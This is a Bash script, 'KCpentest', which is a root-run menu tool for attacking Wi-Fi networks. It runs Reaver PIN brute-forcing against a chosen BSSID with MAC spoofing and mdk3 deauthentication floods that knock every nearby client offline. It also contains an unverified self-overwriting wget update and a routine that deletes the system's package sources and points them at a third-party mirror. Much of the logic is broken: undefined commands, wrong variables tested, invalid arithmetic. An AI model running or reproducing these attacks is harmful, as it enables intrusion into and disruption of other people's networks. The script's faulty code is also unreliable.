#!/bin/bash
# Script By Eka Syahwan                                                                                      #
# KCpentest - Newbie Pentest Tools                                                                           #
# www.facebook.com/eka.syahwan                                                                               #
#                                                                                                            #
# forgive me if the code is a mess,                                                                          #
# you can contact me through my email eka.syahwanmail@gmail.com                                              #
# if you help me in designing and adding the latest features then you will be my display name in the script. #
##############################################################################################################
if [ "$(id -u)" != "0" ]; then
   echo "This script must be run as root" 1>&2
   exit 1
fi
version="1.0.0"
versioname="beta"
OS=`uname -o`
author="Eka Syahwan"
myrouterip=$(ip route show default | awk '/default/ {print $3}')
myinterface=$(ip route show | awk '(NR == 2) {print $3}')
myipaddress=$(ip route show | awk '(NR == 2) {print $9}')
loading ()
{
    bar="...........L.....O.....A.....D.....I.....N.....G..........."
    barlength=${#bar}
    i=0
    while ((i < 100)); do
n=$((i*barlength / 100))
        printf "\e[00;32m\r[%-${barlength}s]\e[00m" "${bar:0:n}"
        ((i += RANDOM%5+2))
        sleep 1
    done
}
masuk ()
{
    bar="--------| L ... O ... A ... D ... I ... N ... G |--------"
    barlength=${#bar}
    i=00,1
    while ((i < 100)); do
n=$((i*barlength / 100))
        printf "\e[00;32m\r[%-${barlength}s]\e[00m" "${bar:0:n}"
        ((i += RANDOM%5+2))
         sleep 00.1
    done
}
clear
startX 
clear
echo -ne "\e[01;32mKCpentest (Check Update) [y/n]>\e[00m "
read pilihanx
echo ""
if [[ $pilihanx = Y || $pilihanx = y ]]; then #pilihan 1
### Check for updates !
if [[ "$silent" = "1" ]];then
	echo "Not checking for a new version : silent mode."
else
	changelog=$(curl --silent -q https://raw.githubusercontent.com/ekasyahwan/KCpentest/master/release)
	versioname=$(curl --silent -q https://raw.githubusercontent.com/ekasyahwan/KCpentest/master/versioname)
	last_version=$(curl --silent -q https://raw.githubusercontent.com/ekasyahwan/KCpentest/master/version) #store last version number to variable
	if [[ $last_version > $version ]];then # Comparing to current version
		echo -e "You are running version \033[31m$version\033[m, do you want to update to \033[32m$last_version\033[m? (Y/N)
Last changes are :
$changelog"
echo -ne "\e[01;32mkcXrepID> [Y/n]\e[00m "
		read update
		if [[ $update = Y || $update = y ]];then
			echo "[+] Updating script..."
			wget -q http://127.0.0.1/coba/sukses.sh -O $0
			chmod +x $0
			echo "[-] Script updated !"
			
		else
			echo "Ok, continuing with current version..."
		fi
	else
		echo "No update available"
	fi
fi
### End of update process
else  #pilihan tidak di dukung
echo -e "\e[01;31m[!]\e[00m Ok, continuing with current version..."
    echo ""
    fi
masuk
clear   
echo -e "\e[00;32m######################################################\e[00m"
echo -e "\e[00;32m##                    Version  : \e[00;31m$version [$versioname]\e[00;32m      ##\e[00m"
echo -e "\e[00;32m##   _  _______                                     ##\e[00m"
echo -e "\e[00;32m##  | |/ / ____|                 _            _     ##\e[00m"
echo -e "\e[00;32m##  | ' / | Newbie Pentest Tool | |          | |    ##\e[00m"
echo -e "\e[00;32m##  | ' / |     _ __   ___ _ __ | |_ ___  ___| |_   ##\e[00m"
echo -e "\e[00;32m##  |  <| |    | '_ \ / _ \ '_ \| __/ _ \/ __| __|  ##\e[00m"
echo -e "\e[00;32m##  | . \ |____| |_) |  __/ | | | ||  __/\__ \ |_   ##\e[00m"
echo -e "\e[00;32m##  |_|\_\_____  .__/ \___|_| |_|\__\___||___/\__|  ##\e[00m"
echo -e "\e[00;32m##             | |                                  ##\e[00m"
echo -e "\e[00;32m##             |_| Script By \e[00;36m$author    \e[00;32m        ##\e[00m"
echo -e "\e[00;32m##                                                  ##\e[00m"
echo -e "\e[00;32m######################################################\e[00m"
echo -e "\e[00;32m---> $OS <----\e[00m"
echo -e "\e[00;36m1. Reaver WPA Attack\e[00m"
echo -e "\e[00;34m2. Kill Connection\e[00m"
echo -e "\e[00;34m3. Kali Linux Menu\e[00m"
echo -ne "\e[01;32mKCpentest >\e[00m "
read pilihan
echo ""
if [ "$pilihan" = "1" ]; then #pilihan 1
echo -ne "\e[01;32mKCpentest (M)anual (A)auto >\e[00m "
read reaverpil
if [[ $reaverpil = "M" || $pilihanx = "m" ]]; then
echo -ne "\e[01;32mKCpentest (Interface) >\e[00m "
read reaverinterface
echo -ne "\e[01;32mKCpentest (monitor interface [mon0/eth0]) >\e[00m "
read reaverinterfacex
echo -ne "\e[01;32mKCpentest (BSSID Target) >\e[00m "
read reaverbbsid
echo -ne "\e[01;32mKCpentest (Channel Target) >\e[00m "
read reaverchannel
airmon-ng start $reaverinterface 
ifconfig $reaverinterface down
macchanger $reaverinterfacex
ifconfig $reaverinterface up
clear
reaver -i $reaverinterfacex -c $reaverchannel -b $reaverbbsid -vv
$0
            fi
if [[ $reaverpil = "A" || $pilihanx = "a" ]]; then
echo -ne "\e[01;32mKCpentest (BSSID Target) >\e[00m "
read reaverbbsid
echo -ne "\e[01;32mKCpentest (Channel Target) >\e[00m "
read reaverchannel
echo -ne "\e[01;32mKCpentest (monitor interface [mon0/eth0]) >\e[00m "
read reaverinterfacex
ifconfig $myinterface down
macchanger -a $reaverinterfacex
ifconfig $myinterface up
clear
reaver -i $reaverinterfacex -c $reaverchannel -b $reaverbbsid -vv
$0
            fi
            
           
elif [ "$pilihan" = "2" ]; then  #pilihan 2
echo -e "\e[00;36m1. Turn Off All And Protect me\e[00m"
echo -e "\e[00;34m2. Kill All\e[00m"
echo -ne "\e[01;32mKCpentest >\e[00m "
read mdkpil
if [[ $mdkpil = "1" || $pilihanx = "1" ]]; then
echo -ne "\e[01;32mKCpentest (BSSID You)>\e[00m "
read bssidyou
echo -ne "\e[01;32mKCpentest (mon0/eth0)>\e[00m "
read mdkinterface
airmon-ng start $myinterface
echo $bssidyou > white
mdk3 $mdkinterface d -w white
$0
            fi
            if [[ $mdkpil = "2" || $pilihanx = "2" ]]; then
echo -ne "\e[01;32mKCpentest (mon0/eth0)>\e[00m "
read mdkinterface
airmon-ng start $myinterface
mdk3 $mdkinterface d d
            fi
elif [ "$LEVEL" = "3" ]; then  #pilihan 3
echo -e "\e[01;32m[-]\e[00m 1. Update"
echo -e "\e[01;32m[-]\e[00m 2. Upgrade" 
echo -e "\e[01;32m[-]\e[00m 3. Upgrade-Disk" 
echo -e "\e[01;32m[-]\e[00m 4. Repository Update"
echo -ne "\e[01;32mKCpentest >\e[00m "
read kalimenu

if [[ $kalimenu = "1" || $kalimenu = "1" ]]; then
apt-get update
$0
            fi
            if [[ $kalimenu = "2" || $kalimenu = "2" ]]; then
apt-get upgrade
            fi 
            if [[ $kalimenu = "3" || $kalimenu = "3" ]]; then
apt-get update
apt-get dist-upgrade
echo -ne "\e[01;32mKCpentest (reboot now) [Y/N]>\e[00m "
read rebootkali
 if [[ $rebootkali = "y" || $rebootkali = "Y" ]]; then
reboot 
            else
               $0
            fi
                        if [[ $kalimenu = "4" || $kalimenu = "4" ]]; then
rm -rf /etc/apt/sources.list
echo deb http://kali.indonesianhacker.or.id/kali kali main contrib non-free >> /etc/apt/sources.list
echo deb-src http://kali.indonesianhacker.or.id/kali kali main contrib non-free >> /etc/apt/sources.list
echo deb http://kali.indonesianhacker.or.id/kali-security kali/updates main contrib non-free >> /etc/apt/sources.list
echo deb-src http://kali.indonesianhacker.or.id/kali-security kali/updates main contrib non-free >> /etc/apt/sources.list
echo "Repository Kali Linux already updated"
sleep 2
            $0
            fi 
           
            
            
            
elif [ "$LEVEL" = "4" ]; then
echo ""
    echo -e "\e[01;32m[-]\e[00m COba 4"
elif [ "$LEVEL" = "5" ]; then
echo ""
    echo -e "\e[01;32m[-]\e[00m Desperate Stealth selected, please wait a few minutes"
else  #pilihan tidak di dukung
echo -e "\e[01;31m[!]\e[00m You didnt select a option, exiting"
    echo ""
$0
fi
